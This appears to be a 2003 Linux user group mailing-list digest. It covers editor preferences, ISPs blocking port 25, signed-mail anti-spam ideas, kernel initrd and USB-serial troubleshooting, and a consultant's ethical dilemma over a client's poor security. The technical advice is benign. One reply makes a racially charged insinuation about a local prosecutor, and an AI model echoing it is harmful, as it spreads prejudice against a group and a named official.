           NOW JUST DO THESE THINGS WITH VI MY FRIENDS!!

reading, writing, math, editing, programming, email, dired, chat
client.  my screen is usually entirely rxvt and emacs windows.
the only other "application" I use regularly is mozilla
(firebird), which is annoyingly big and heavy.  I'm amused that
people who a decade ago were griping about bloatiness of emacs
are today happily using web browsers that are orders of magnitude
bigger and more complex.

firebird uses up a lot more screen real estate too.  I feel like
I'm constantly fighting guis to get a screen that's filled with
meaningful information rather than 'chartjunk'.

Before I get into too much trouble for bashing vi, I will admit that
I do use and like vi as well as emacs.  vi is compact and fast relative
to emacs.  I prefer vi to emacs for small simple editing tasks where
one isn't going to be in the editor all day.  However, for heavy duty
jobs I prefer emacs.

not having any effect on spam for local users.  It makes little sense to
me.  It served to royally piss me off.

No, I have a friend also on this DSL who both runs his own server and
uses their email service as a backup... it was news to him when I sent
him an email regarding the problem.  His was the only mail server I
*could* connect to (aside from the mail.web-ster.com one), as we're both
on the same segment of their little DSL network.

I too use joe on a regular basis. Aside from the lack of syntax 
highlighting, joe does a great job at my day-to-day tasks.

Heh.  Started with Pico, went retro with Joe for a few years, even
despite the jeers of my vi-using co-workers.  Then I met a lovely gal.
Who served me coffee in an old, well-used mug with a vi reference on it.

We've been together for three months now and I use vim for just about 
everything.

No.  It doesn't matter.  Once you hit the limits of the resolution,
that's it.  That's all the better you get.  If you're trying to
identify, say, a tattoo on someone's arm at a weird angle from the
footage, or try to read a license number off a plate someone has
(illegally) put a plastic cover or sprayed some glaring substance
over, an area of 120 pixels is going to be the same 120 pixels no
matter how big you blow it up.

It's not like with analog picture where you can go digitize the video
when you need to, at whatever resolution you need to, and then go nuts
tweaking it until you can make out what you need to.  And if you need
more resolution, just go re-encode from the original.

And yet, you're still limited by the resolution of the camera.  Which
means anybody standing across the room from the camera, when you go to
magnify the image, is going to look like they're on COPS: A blurry,
pixelated picture.

That's probably your most practical use for digital cameras.
Especially if where you're putting these up is a shop that has them
already for video telephony, just keep enough of the machines always
on to get motion sensor coverage where you want it.

Indeed, it looks like they do.  I use Postfix, too....

They at least are not configured as an open relay.  :-)

The issue I'm having is they decided the *only* way *anybody* on their
network is able to send email outside of their network is through their
own mail server, forcing my mail server to go through their mail
server...

It just seems to make no sense.

What better way to keep an eye on email traffic?  Makes for easy
filtering too.  I've heard of a few ISP that are doing that kind of
blocking.

Was this a custom compile or an image install?  Did you change the
lilo.conf entry to reflect the new initrd image?  It looks like the
kernel is trying to read the wrong initrd image, or was not compiled
with the correct options for cramfs and initrd.

Good Luck,

You have to admit that from the perspective of everybody else, it does
show some kind of "responsibility" on the behalf of the ISP to attempt
to stop spammers. It does, however, also incur a kind of liability, as
it only removes the use of open relays from the spammer's toolkit.

? Of course analog has a wider bandwidth than digital, but you will always 
be limited to the bandwidth of your recording device (&camera, &cabling, 
&switcher, etc) which is far from infinite even on fresh tape.

You still are with an analog camera.

Don't get me wrong, I'm an analog kind-of-guy, but these are not good 
reasons why digital is worse.

Well.. I do a similar thing on my LAN to what my ISP does... the primary
differences being my method takes away little if any compatibility with
existing software.  There's nothing stopping them from redirecting all
port 25 traffic to their mail server, as AOL does.  That would, at the
very least, cause fewer issues with folks who want to directly connect
to an SMTP server... they'd still connect to mail.web-ster.com, but they
wouldn't know, nor would they likely care.

I would be slightly happier with that approach.... but only slightly.

Since most of their clients are using their web-ster email accounts as
their primary accounts, why not just set up some virus filtering there,
so the spammers cannot gain their foothold in the first place?

Or better yet... *educate* their customers.  Web-ster does *not* have a
very large user-base by any stretch of the imagination.  I've worked
with them extensively with various problems over the last three or four
years... two years ago they had one person working as tech support, and
he didn't seem particularly busy.

Educate the Windoze (l)users about keeping their software up-to-date via
windowsupdate.microsoft.com ... and about viruses... tell them about AVG
and the like.  Teach them how to update the stuff.  They're treating a
symptom, not the disease.....

All the correct answers, of course. Just providing an alternate
insight to why these ISP's do that. I ran into that with our
travelling rep's using an Earthlink account previously and it's just
no fun.

Anytime all mail is authenticated by a user, assumptions can be built
into servers and clients.  The arguments about challenge/response spam
filters go away when you can tell who the user is via a keyserver tied
to something like razor.  Do not underestimate this one.  If you can
test all incoming mail against known friends, unknown but verified by
the keyserver you like/trust, unknown but valid signatures, and known
signatures of spammers, you have a strong case for SPAM ratings. 
Remember this assume signatures are the norm.  Spammer could keep
changing keys, but they would need to do that for each mailing, or until
their key is known.

This happened before when email addresses were harder to fake.  You
could block based on incoming email name with really good accuracy.  

Mail servers can allow relaying based on keys (I assume some do
already).  As this becomes the norm, then the reasons for open relays
start to drop.

Well spend a while on any mail client list and see the complaints. 
Kmail users on evolution's list is prime example.

While there is agreement PGP/MIME is better in general, until the other
clients are fixes, the whining is not such a bad thing.

vim seem to be the standard.  The one great thing about vi over emacs,
is that it I can hop on 10 different systems in a hour, and vi works the
same on all of them.

Now that vim is so much more improved than vi, and the linux default
setup makes more sense than freebsd, I find my self stymied by lack of
command history, slightly different regex rules, and some other things. 
But on the whole vim is almost always there.

Oddly gvim and other graphical vi's never seem to work for me.  I want
to cut and paste in a terminal, like a X based terminal, not notepad.

their Web site does not show a unit for that particular model.

It was a custom kernel from the kernel.org sources.  I believe that I
need the cramfs/initrd kernel patch to boot this way.  The only place I can
find that is the debian kernels (the patch and others are included).
I think I need to use the source package and not the compiled .deb
cause I want to reuse my .config file.  Correct?

Ditto.  I type "screen emacs" about once every two months.  I leave
an emacs session going constantly.  I "connect" to it, and fire
off my shell sessions within it.  It's my entire interface for 99% of
my work.

Forgive me if I've failed to parse the above the way you intended. Are
you saying `vim' has no command history? Within `vim', try:

Yes, but you might want to get the source from debian, most of the
patching is probably done.  Any particular reason for wanting to use the
.config from the older kernel?  Custom compiled kernels shouldn't need
an initrd image, you can compile in all the parts that are required for
the kernel to boot successfully. Not that it can't be done, it just
seems that making the kernel with all the parts for your hardware
built-in would be better.

As someone else mentioned, EarthLink began doing that a while ago.

Other ISPs have also jumped on the bandwagon, in worse ways. The
outfit that provided Internet connectivity for the OGI faculty retreat
last year *silently* redirected all port-25 traffic to its own mail
server.

At least with a flat-out block you'll eventually get an SMTP error
message. With a silent redirect, there's no recourse. If we hadn't
been testing some SMTP/AUTH stuff, we'd have never realized the
problem -- and had the ISP's server gone down, we wouldn't have
received any notice that the mail hadn't been delivered.

The other thing is that some large ISPs (e.g., AOL) will no longer
accept mail from IP blocks known to contain dynamically assigned
addresses. AOL isn't alone; there are plenty of mail admins on the
mimedefang mailing list who will only accept inbound SMTP connections
from official mail servers on, say, the rr.com or comcast.net IP
blocks.

I really don't care what sort of pseudo-self-justifications virus and
spam writers uses to feel good about themselves. Their activities just
suck. Period.

I wanted the old .config cause it worked well before and it should
work well again.  At least that was my way of looking at it.  The
initrd was only cause that was the way Libranet set it up for me
initially.  I thought I had to do it to support my RAID  array (IDE)
which appears as a SCSI device.  Is that not right?

I sent an email off to SuSE asking and will post the reply back to the
list if I get one. I asked about another source and they did reply
saying it wasn't legal, so I think I will get a reply. 

Did you do a md5sum on the disks and and do they match the official
disks? I wouldn't call some person on ebay a trusted source. Ebay might
be the best way to compromise SuSE systems.  No hacking, just a little
social engineering ( who can resist a deal ), especially, as I don't
think the disk md5sums for the disks are posted anywhere on SuSE.

I think that using the old .config may leave you short, there were some
changes to the kernel options from one version to the next.  If the
drivers for the RAID array (and all other essential devices) are
compiled into the kernel (not as modules), then you will not need the
initrd image.  Don't forget to change lilo.conf to reflect the lack of
initrd for the new kernel.  You might want to set up lilo to give you a
selection of kernels to boot from, in case your custom one doesn't work.

Good Luck,

I got the posting below from Marsee Henon <marsee at oreilly.com> at
O'Reilly.  I don't have time to follow up on this and besides I
don't know if anyone wants to travel to San Diego to take advantage
of this should they win a pass to The Third Annual O'Reilly Emerging

So every client has to maintain a separate list of known spammers?  I
don't know, the web of trust is a fine idea, but I don't think it is
strong enough to tackle spam.

Depends on how vim is setup.  In RH9 I see in
/usr/share/vim/vim61/macros/vimrc history=60.

But on a FreeBSD system I am on at the moment, there is no default vimrc
file that I can see.  Also things like arrow keys start to mess up
(terminal issues).

My point is I am *use* to command and search history, I love them.  But
when I am jumping systems, it can kill me.  Yes I can port my exrc, or
virc, or vimrc files, but often I can't.  Also the stability of vi/vim
between sites is why I like it (Oh that and I learned to edit in "ed" on
terminal so all the keystrokes make sense to me!).

Bah!  Kitchen-sink editors are not essential tools.  vim is perfect for
config' files, and if I want to read my email, I'll run an email client.
 For coding, I prefer jedit.

No, you subscribe to a list of known spammers (ala razor).  Remember
this is "in the future" where everyone normally signs their email.  Thus
spammers to avoid being easily filtered will have to sign their emails. 

They then have a few choices, 
        Fake the signatures
                This will fail a automated system.
        Sign as a unknown user
                This will raise their spam score.
                Once this is a known spammer it will clinch it
                (razor-PGP)
        Sign as a different user each mail
                This always makes them an unknown and makes it harder to
                send bulk mail.
        Not sign the mail
                The most likely tactic, this will raise their score
                
Currently Spam Assassin can white list people as they send non spam
mails to you.  This slowly builds a negative spam score.  With
signature, this could be 100% on the first time a non-spam mail is
sent.  Thus you will always be sure that the email is from a legit
person.  Once that person starts spamming, then you tag the key, send it
razor-PGP and the account is bad.

Now the razor-PGP idea is a blacklist and has all the issues that all
blacklists have, but it is far more effective than the current
score/weight scheme.

pipe() creates two *new* filehandles. It works like the lowlevel
system call of the same name and creates a new unidirectional pipe. To
do what you want with pipe() alone, would require multiple pipes and
forked children (just like C). With higher level piping, if you want
to do something involving constructs like "|tr|", you need to use
IPC::Open2 or Open3. There's probably a module that lets you do what
you wanted more directly, but here's[1] a simpler[2] solution[5]
similar to your problem:

#!/usr/bin/perl -w

use IPC::Open2;
use strict;

my($content) = <>;
open2(\*SUB_OUT, \*IN, "rot13") or die "suspicious!\n";
open2(\*OUT, \*SUB_IN, "wc -l") or die "dangerous!\n";

print IN $content;
close(IN);

my($translated) = <SUB_OUT>;
close(SUB_OUT);

print SUB_IN $translated;
close(SUB_IN);

my($count) = <OUT>;
close(OUT);

print $count;

[1] Use it like this: "perl foo < some_document"
[2] And useless[3]
[3] And not even efficient[4]
[4] But then again, maybe perl helps optimize some of this
[5] "\*OUT" is a convention required for strict because open2 is a
sub, not a native function.[6]
[6] Also notice that the order of close()'s is important. If you don't
close the input on, e.g., rot13, it won't stop reading and flush its
output.

I think the motivation was just complaints about spam coming from their
IPs, regardless of whether it went through their SMTP relay or not.  So
now they're trying to filter all mail traffic in hopes of avoiding phone
calls and blacklists.  It's really not the ISP's responsibility, and
they shouldn't be firewalling their customers, but it's a pragmatic
issue.

Chris,

  Actually, they cost an outrageous amount of money regardless of where one
buys them. But, ... I discovered when down at Fry's that the port replicator
does not have a serial port and that's what I need for my digital camera. So
I bought a USB->serial adapter instead. For a _lot_ less money.

  Now I need someone to point me to the appropriate documentation so I know
what I need to do to make the system see the serial port on the end of the
USB cable.

Thanks,

Rich

Mine does have serial, but if I'd'a know, I'd definitely've
recommended the USB path, totally.

AFAIK, just have all the right modules enabled in the kernel and have
hotplug all setup right. Don't have the gear around here to be more
specific, sorry.

Message-ID: <Pine.LNX.4.56.0312091233070.30860@salmo.appl-ecosys.com>

  I just purchased a USB->serial converter manufactured (or, at least sold)
under the brand name "SIIG". No model number.

  According to the linux-usb.org USB-Guide, I need to "turn on USB Serial
Converter support, and then select whichever of the various particular
drivers you need. The Generic Serial Driver can be used with a wide range of
converters, by specifying the vendor and product ID codes when you load the
USB serial converter module: insmod usb-serial.o vendor=0xVVVV
product-0xPPPP, where you need to change the VVVV and PPPP to match your
device."

  Can someone suggest where I get the vendor and product codes for this
puppy? Also, I do not have usb-serial.o on my new laptop; only usb-serial.h.
However, I do have /dev/ttyUSB0 and /dev/ttySUB1.

  What I want to connect is my digital camera: an Olympus D-340L. Yes, it's
an antique, but it does all I need it to do.

All suggestions appreciated,

Rich

***Wil Wheaton to Write Three Books for O'Reilly
Any honest computer geek will admit that his obsessive coding is, at
heart, a futile attempt to create a world as cool as those depicted in
science fiction. New evidence of the symbiotic relationship between Sci Fi
and geekdom surfaced, as O'Reilly, the geek publisher-of-record, announced
plans to publish three books by Wil Wheaton, blogger, geek, and the actor
who portrayed Wesley Crusher on Star Trek: The Next Generation. Wil's
first two books, "Dancing Barefoot" and "Just a Geek," are almost
unbearably honest tales of life, love, and the rigors of being an ensign
on the Starship Enterprise.

They will be in dmesg or /var/log/message when linux sees the usb device
attach.

Getting latest hotplug, http://hotplug.sf.net, should help.  Really, it
may very well take care of all your issues.

The module that gets built is usbserial.o (no -).  

'locate usbserial' shoudl find it.  Otherwise you will need to compile
the kernel module.  In RH9 I see it just fine.

Actually this is done by the dial up POP people as well.  RADUIS has the
fields in it now to allow connections to the accounts specified SMTP
servers, but I could not get Earthlink to accept mine.  I didn't fight
very hard.

The way I know this is done by the POP not the ISP is that earthlink
will allow SMTP at *some* dialups and not others.  That was so much to
remote troubleshoot to the VP of sales.....

Shortly after that a Virtual ISP I help admin had to fill those fields
out in Radius.....

Worse is tmobile/starbucks hotspots.  They say it works, but they hijack
the stream, and send the mail themselves while foobaring the DNS.  This
means sites like mine that refuse mail servers with bad DNS in helo, it
rejects them.

I have seen this in Lake Oswego and Chicago.  

The best is T-Mobile states something that leads tech-savvy people
believe they are sending via the users ISP's account....

As Chris said, it is a matter of compiling in the correct kernel modules.
assuming the USB->serial adapter you bought is supported.
Then after connecting the device it appears as something like /dev/ttyUSB1. 
Which USB->serial adapter did you get? I have a Portgear by XIRCOM that is 
sort of supported by the newer linux kernels. I am using it to connect
to a GPS, but it normally only works for a couple of minutes and then
quits. Does anyone have any suggestions for fixing this problem?

An alternative: mount -t usbfs none /proc/bus/usb (or make sure it's
in /etc/fstab) and then get the usb utilities and issue "lsusb". Kinda
like lspci.

I'm fairly certain you need to the mount to make hotplug work right, too.

  Thanks, Zot. That URL gets a blank page; google tells me it's
http://linux-hotplug.sf.net. And, sure enough, it is.

> The module that gets built is usbserial.o (no -).

  Sonofagun! The USB-serial Web page had it hypenated. The module is there,
and modprobe loads it just fine. What alias/entry should I use with this in
/etc/modules.conf?

> I take it the laptop does not have a serial port at all?

  No. That would have obviated the entire issue. :-) While the Sony is twice
as heavy as the Toshiba, 1 kg vs. 500 g, it has no serial port, parallel
port or floppy drive. It does have a cd-rw drive, monitor port, two USB
ports, a pcmcia slot and built in winmodem and ethernet. The winmodem should
work once I replace the trashed driver. (I cannot build it here because the
slackware-9.1 distribution uses gcc-3.2.3 and Emperor Linux built the kernel
on a Red Hat 7.3 box with gcc-2.96. Sigh.)

Thanks,

Rich

Message-ID: <1071005607.16708.38.camel@nat.alcpress.com>

I need some opinions to solve a moral and business
dilemma.

I have a consulting customer that runs a Windows shop.
At least two of their Windows computers have been
attacked and we've reinstalled Windows each time. They
then install their Norton software on the computer and
declare it secure. Surely, nothing bad should happen if
Norton is installed, they think.

We've replaced their Windows 2000 server with Linux acting
as a firewall and router so we now have control over that
part of the network but we have no control over desktop
computers running Windows. They run Outlook and I suspect
this is how they're being attacked.

The main problem is my customer's attitude. They do not
care about security if it's the least bit inconvenient.
Worse, they don't care about the privacy of their customer
data. Their customers are individuals who would be devastated
by identity theft. Their personal data is stored on this
company's server and there's no effort to protect it.

As long as attackers don't delete their data files, this
company doesn't seem to care if their data files leak out to
the Internet. They would be unwilling to spend the money to
have me secure their computers. 

I'm concerned about numerous issues. Primarily, I see this
as criminal negligence and I don't know what to do about it.
Secondarily, I'm wondering about the risk of being named as
a defendant should one of their customers be victimized in
some way.

Zot,

  Hotplug is available on the system already. Do I load that module
('modprobe pci_hotplug' or 'modprobe cpqphp'), too?

  I'm sure this will all seem "intuitive" once I learn what I'm doing here.
:-)

Thanks again,

I don't even bother using sendmail when I'm on a laptop because I hate
having to tail the mail log just to see if what did and didn't get
delivered.

Instead, I have SMTP/AUTH over TLS enabled on port 587 both at home
and at work. If an ISP did hijack the connection, I'd know because
pine would complain about the cert. :-) Plus, if the addressee's MX is
down, the message spools on a machine that will almost surely be
powered on and connected to the Internet when the queue is run again.

Why would that make it harder?  Keys can be generated easily enough, and
spamming from multiple servers (as is often done using RATs) would make
it even easier.

Why score unsigned emails at all, since mere addresses can be spoofed? 
Aren't unsigned emails filtered in this hypothetical future?

I still don't see a spam solution here.  For one thing, it seems a
single key could be used for thousands of UCEs before being effectively
blacklisted.  For another, even using a different key for each email
does not seem impracticable.

If you want, I can build the thing for you... or provide you a shell
account to build it yourself...

I added GCC 2.96 to my Slackware 8.1 'server' a while back to build a
Jabber transport that required said defective GCC version.  I added GCC
2.96 and GCC 3.2.1 to the already existing GCC 2.95 Slackware 8.1
shipped with.

Chris:

 lsusb returns:

  Some hand-holding here in getting everything I need in /etc/fstab and
/etc/modules.conf would keep me from heading off in the wrong direction.

rot13 doesn't have to slurp all the input before writing output.
if $content is large, say more than 40k, then the 'print' will
block waiting for 'rot13' to read, and 'rot13' will block waiting
for perl to read.

pipefitting is nontrivial, and it's also a solved problem.  just
let the shell do it.
    open OUT, "| program1 | program2 > file.out";
unless you really want to handle the pipefitting yourself.

some reasons you might want to do it yourself
    error handling
    problems safely quoting args for the shell
    no shell
can't think of anything else offhand.

I would think that if your concerns are documented and the companies
lack of desire to implement the security changes, you should no be held
responsible.  Just my 2 cents, I'm not a lawyer.

What happens when you plug the device in?  Usually USB devices, even if
they have no drivers will still load their identifying codes (that is
how hotplug knows which drivers to load for the device).  Check syslog,
or console for the output.

That's odd. It's choking on your serial adapter? Try lsusb -v? (It'll
be very long. Maybe mail it privately and I'll requote to list
relevant parts?)

In /etc/fstab:

none /proc/bus/usb usbfs defaults 0 0

But make sure it's after the normal /proc. :-)

(On Debian the hotplug package handles this all implicitly, in case
you were and we're doing too much.)

Don't you just love that attitude?  In my experience, Norton is one of
the worst players in the AV field.  It is somewhat unreliable, it

to automatically update itself as some others can be.

Is this server running an email server, as well?  While not quite on the
business/ethical side of things... but rather on the technical end - you
could quite effectively use this to filter incoming content or viruses. 
Even if you aren't running the SMTP stuff yourself, you can capture POP3
and scan it.

If you're running the SMTP stuff yourself, go get AMaViSd-New and
ClamAV.  As we discussed in the "Damned ISPs" thread, it's pretty easy
to silently force all outbound SMTP connections through the scanning
SMTP server.

POP3VScan, I think is the software that can be used to act as a POP3
proxy, filtering things through a virus scanner.  I have a friend who is
attempting to branch the thing after adding support for SpamAssassin
(making it as effective as Postfix+AMaViS when you are not running your
own mail server).  I can look up specifics on that if you wish.

If you aren't running a transparent Squid proxy on their gateway, you
may look in to that.  It will speed up web browsing for them and offer
an easy alternative to local ad-zapping software.  They could also
filter out sites they don't want their customers connecting to.  There's
also an OAV software program called 'Squid-vscan' which will allow you
to scan all HTTP traffic for viruses.

I have experience with most of the above (just not the POP3 stuff,
really) if you decide to go forward with it and need a hand...

There has to be somebody in the office with a Clue or somebody who might
respond well to a clue-stick-beating...

If their customer data leaked, and they have a decently sized customer
base, they surely must realize if criminal charges were not filed, they
would at the very least come out of the thing with a black eye and many
lost customers.

I don't know that I would call it criminally negligent, but I suppose it
depends on the DA.  In Portland, I guess one really never knows.  Maybe
ol' Cats will decide to jump in and make sure she gets a few seconds on
the news.  *Especially* if there are any African Americans involved.

If you present them with your point of view that their setup is
insecure, and they need to do this, this, this, and that to secure it...
and they refuse you, I really can't see any likelyhood of you being
named as a defendant.  Even if you say nothing at all, I don't see it as
being very likely.

If I were you, I would just be extremely sure your point of view that
what they are doing is not good is heard, even at the risk of
potentially losing a customer...

I'd say being a whistleblower would certainly be one possibility, yes.

That's what it comes down to. If you have ethical issues with what
you're being asked to do, and they won't do the right thing, then just
don't do it.

"I'm sorry, but I cannot in right conscience allow you to treat your
customers private data in this fashion. It is a tremendous liability,
and I don't want to run the risk of being involved in any legal action
against myself. I hope that we may do business in the future."

It's tough in this economy, but so is a lawsuit.

Some discussions that might help:

http://ask.slashdot.org/article.pl?sid=02/12/13/0333231

And this might provide some guidance:

http://sageweb.sage.org/resources/publications/code_of_ethics.html

As a consultant you have the advantage that you can walk away easier than
if you were an employee.  Unfortunately, you also have the disadvantage
that they probably value your opinions even less than usual.

One thought that might help get their attention-- go see a lawyer and
draft up an exclusion of liability which basically states that you KNOW
there are massive security problems and have been prevented from repairing
them.  Have the company assume any liability for damages which might be
brought against you and have the paper signed by an officer of the
company, preferably the CEO.

I'm pretty sure you can't reassign liability for criminal charges, so if
it's really criminally negligent-- get out fast.

I think you'll always find there are inconsistencies when dealing with
others regarding infosec; they'll have their biases and approach and
you'll have yours. I don't believe the solution lies in forcing them to
change at any cost (assuming you still want to maintain a relationship),
but to find a way to manage the situation. 

One such solution might be to outline exactly what you think the the
threats are to the systems and their vulnerabilities and asses what you
feel the overall risks are. Provide them the information, obtain some
acknowledgement that they've read and understood it, then let them
decide on a course of action. That is consulting, after all. 

Ideally, they become more aware, you become absolved, and you maintain
your customer. 

Hope that helps.

cheers,
Sasha

Derek,

  When I plug in the camera and try 'photopc list', I get:
Error 13: open /dev/photopc error Permission denied.

  I tried this after linking /dev/photopc to /dev/ttyUSB0 and /dev/ttyUSB1.
/dev/photopc has mode 777.

  When I type 'lsusb' with the camera connected via the adapter I see:

Bus 002 Device 001: ID 0000:0000 Virtual Hub
Bus 002 Device 002: ID 054c:0069 Sony Corp. Memorystick MSC-U03 Reader
Bus 001 Device 001: ID 0000:0000 Virtual Hub
Bus 001 Device 002: ID 0b39:0421

  The bottom line is new so I think I'm getting there.

Thanks,

Rich

Get the latest, or make sure you have it.

In RH hotplug now runs a service, so you can restart it.

I am not sure what it does, but it probably resets things.  Rebooting
should do the trick (yes rebooting since this watches and loads
modules).

Once it is loaded hotplug will attempt to automatically do "things" as
appropriate is user space.  Often it loads to right modules and sets up
mounts.  It is automagic.  So either it does the trick, or not.

The perms of the link allow you to follow the link.

The perms of /dev/ttyUSB0 and /dev/ttyUSB1 are far more critical.

Seems so.  My latest stab was to use the pristine kernel.org kernel
and apply the debian patches (from backports.org) to allow using
initrd/cramfs.  Now I just hang up with a line that says: 
INIT: version 2.84 booting.
I had no luck trying to avoid using initrd.  Couldn't seem to get the right
combinations of drivers.

That last line for ID 0b39:0421 is the device id for 
the usb to serial adapter produced by
Omnidirectional Control Technology Inc. 
http://www.octinc.com.tw/products/usb_to_serial.html

looking through the kernel, this device is supported
by the ftdi_sio driver http://ftdi-usb-sio.sourceforge.net/
I don't know if you have to explicity load this module 
or if usbserial loads it for you, but you might try
modprobe ftdi_sio

Try this:  probeall usb-interface usb-uhci usbserial

That's basically what works for my 2.4.21-0.25mdk kernel.

YMMV,

Has anyone used the Linux Userland FileSystem (LUFS) and in particular
sshfs?  See:

Yeah, plugging it in changes everything. As has been mentioned, the

Various distributions have support daemons, but ultimately how it
works is that the kernel itself issues a /sbin/hotplug command on
hotplug event. If the script is present and does something fine, if
not, fine. (This is kind of like how modules used to work.)

Notice the product class. :-)

It does sound like if you follow Zot's advice on permissions and the
module is getting loaded correctly by hotplug, then you're in the home
stretch.

I downloaded the disks and checked the hash. The only license relevant
text I found (without spending too much time on my search) on the disks
was the GNU stuff and a blob for yast. Saying you can copy it and charge
money to cover your distribution costs (I don't sell 'em). 

I see no difference between eBay and ftp servers in their ability to
alter and compromise content. 

You may well be right and SuSE's license agreement doesn't allow eBay
distribution. I just haven't found any proof for that, in my limited
search.

Bill,

  I have both a /dev/ttyUSB0 and a /dev/ttyUSB1 listed.

  The brand is SIIG. It has a DB-9 female on one end and a USB male on the
other end. There may well be some sort of intelligence built into the DB-9
case, but I have no idea what it might be. It's a model US2308 and comes
with a mini-cdrom for winduhs and macs. Nothing on their Web site that
suggests anything about a chip or whatever. It does support USB-1.1 so I
imagine that it's back-compatible with USB-2.0

I'm trying to hook up Ximian's Evolution to an OpenLDAP server. Also, I
want to be able to add/change stuff. That calls for authentication.
While there is a field to provide the distinguished name for login, I
find nothing for the password. And the authentication fails too.

Anybody know how to make this work?

Say, does storing customer and lead contacts (=marketing data) in LDAP
make sense at all? It is my attempt to get something like the MS
Exchange Server to work in house for mixed Windows/Linux stations. But
with LDAP's emphasis on securing data over providing ways to add/change
data I have my doubts.

I just gave it a shot...

It worked flawlessly for me, as far as I've seen.  I've mounted two
systems on my LAN and two systems in Mississippi without any problems
whatsoever.  It's fairly easy on the bandwidth, too... surprisingly
enough.

I'm impressed with this thing... it should make life a little bit easier
for me on my disk-space-short laptop.

Maybe you know... 

Where is this specified? Where in Oregon Law does it say that I can't
have a clear plastic license plate cover?

Another question I can't find the answer to in any O.R.S. is, where does
it say I must have a front license plate?

I've searched the O.R.S. high and low, and I don't see it.

Zot,

  Got the latest, converted the rpm to tgz and installed it.

  I discovered there's a /sbin/hotplug, so I tried that. The message was to
run '/etc/hotplug.d/defaults/default.hotplug usb', as usb is the Agent I
want. Did that.

  The connect light on the adapter does not come on.

  I'll try this again ...

  I don't see any difference in the process list and cannot get a light on
the adapter.

  Sigh. I don't know what I'm missing here. It _can't_ be that difficult.

Minutes to days.  I've seen some spam get register minutes after it was
detected.

Does it matter how long?  As long as the time period is less than the
point in time when 100% of the mail is read by victims, then it works. 
If you want, you can hold all unknown mail for a period of time (2 hours
as a guess) until the peak time (when the spammer key is mostly likely
identified and has been reported to the razor-PGP servers).

Oh come on.  By definition it is harder than what spammer can currently
do.  

1)  It forces them to send 1 mail per user.  This greatly increases
overheard *per* mail.  Most spammers still bulk send their mail.

2)  It makes them calculate keys per mail, and sigs per mail. Even
milliseconds adds up when we are talking millions of mails.

3)  It may even make them have to keep those keys around.  If the return
contact is not via web/phone, they have a logistics issue.

4)  All of these processes leave huge forensics trails.

One of the main ways to attack spammer is to penny them to death.  The
average person rarely *sends* less than 100 mails a day.  By making it
troublesome to *generate* and *send* that many mails, but not impact the
per human-generated mail experience (i.e. we do not care about
milliseconds).  This is what challenge-response does.  It is a minor
(for some, major for me) pain in the ass for humans to do once in a
while.  It is currently not worth doing for spammers.

filtering == scoring.  You can score unsigned mail at 100% spam (raise
the spam score above the threshold, or rank them against current style
filters.  My large addressbook has been ported to SP and everyone added
with a non-spam bonus (negative score).  This means the notes from my
friends which look like spam, are protected.

Well, that's not why it won't work.  It won't work because we already

For me, there's a bigger issue here- if they're not going to listen to 
you, and take your advice, why do you want them for a customer? 
Especially over an issue this important. I would run, not walk, away 
from them. 

As far as potential liability, it does not matter how good a contract 
you have, and how rock-solid your disclaimers of responsibility are. If 
someone wants to include you in a lawsuit, you're hosed, even if you 
win. Lawsuits, even suits that go nowhere, cost a tremendous amount of 
time and energy, as well as money. Instead of being able to run your 
business and have life, your life gets eaten up.

IMO, it's not worth it. I would bid them farewell, and document why. I 
think you need to put your concerns in writing, just in case someone 
down the road gets mad and sics the lawyers on them. It could still 
rebound on you, so CYA well on the way out.

This keeps YOU from propagating any email spewing virii that you may be 
infected with to others. 

Several ISPs (notably, Earthlink) do this as well.

With this measure in place, it's very hard for any of their customers to
spread this type of virus without them knowing about it. It's also much
more difficult for someone to be a spam factory on their network, but
that's probably not the intent.

On a RH box (not sure what make)

/lib/modules/2.4.20-6/kernel/drivers/usb/serial/ftdi_sio.o

So you might have to load it if hotplug does not.

Ick, no, do not use the generic usb serial driver.  Almost NO ONE should
use that driver for a real usb serial device.

Instead, use the driver that is for your device.  What does
/proc/bus/usb/devices show with your device plugged in?

Oh, and there is no such thing as "usb-serial.o" anymore, that's quite
old docs.  It's usbserial.o (usbserial.ko for 2.6).  Just modprobe it
and away you go:
	modprobe usbserial

And on all "modern" distros, the hotplug scripts would just
automatically load the proper driver for your device when it is plugged
in.  Why isn't this happening for you?  Are you using a custom kernel?
An old distro?

I used to use `elvis' because that is the `vi' clone that is standard
with Slackware.  However a year or so ago I discovered VIm and am quite
happy to be using that for everything, including editing this email
through `mutt'.  I used `emacs' once, just long enough to have to find a
tutorial on how to exit the stupid thing.

If you're not handling services for Windows systems, viruses are going
to be a nonissue.  Worry about Linux security issues instead:  Keep
yourself patched, use strong passwords, don't reuse the root password
anywhere, and don't leave services you don't use installed.

  Yup. That loaded it, but there's still no light on the adapter nor a
recognition of /dev/photopc as either /dev/ttyUSB0 or /dev/ttyUSB1 (both of
which now have 666 perms).

Well, doing it by hand you may also have to load the host controller
modprobe usci-hcd
Just the fact that /dev/ttyUSB0 exists does not help you. It exists by default,
but is only useful after the driver attaches the usb device to it.

Greg,

  There is no 'devices' in /proc/bus/usb.

  Er, ... no. Slackware-9.1

  All the modules are there and loaded.

  Perhaps the problem is that photopc is looking for /dev/photopc and
doesn't like the link to either /dev/ttyUSB0 or /dev/ttyUSB1. I don't know
to what else to point the camera.

  It's getting to be time for dinner and packing for my trip. I think that
I'll wait until the clinic to try to get this adapter and hsf winmodem
driver worked out.

Many thanks,

Subject: [PLUG] Blocked ports - a solution?
Message-ID: <20031210015903.GA1383@gate.kl-ic.com>

[Discussions of blocked port 25 ...]

I am on Comcast, and it is my only option.  I am not suffering from
blocked ports, and my SMTP out goes through smtp.comcast.net, so this
is not a problem for me - yet.  But the Comcast TOS permits them 
restricting damned near everything, so I assume I am living on borrowed
time.

I talked with a fellow over at Pacifier, and they have a stack of old
Cobalt Raq3's that they aren't using.  They would be willing to fire one
up and rent it to me for a co-location server for a pretty reasonable
price, with a static IP.  My thought is that I could set up an inbound
VPN to the Raq3 (from/to any ports I want, yes? Comcast can't block 
outbound requests to port 80, right?), so I could run my services
through that Raq3.  I see no reason why that connection couldn't be
shared among trustworthy people, with a number of domains terminating
at that single static IP.

BTW, a Raq3 is a P100 with a 15GB disk, and runs Redhat 6 .  I imagine
it could be convinced to run a modern, non-graphic Fedora or Debian
without a great amount of work.   As it is, it runs Apache and has
a pretty decent set of apps on it;  I assume that they are old and
full of security holes, though.  Perhaps the distro can merely be
updated.

I don't have the spare cycles to lead a project like this, but if 
someone else wanted to pursue it I could kick in some labor and some
time.

What modules?

Also, does slackware have the linux-hotplug package?

You need a driver for your usb serial device.  You have a ways to go
before worrying about photopc.

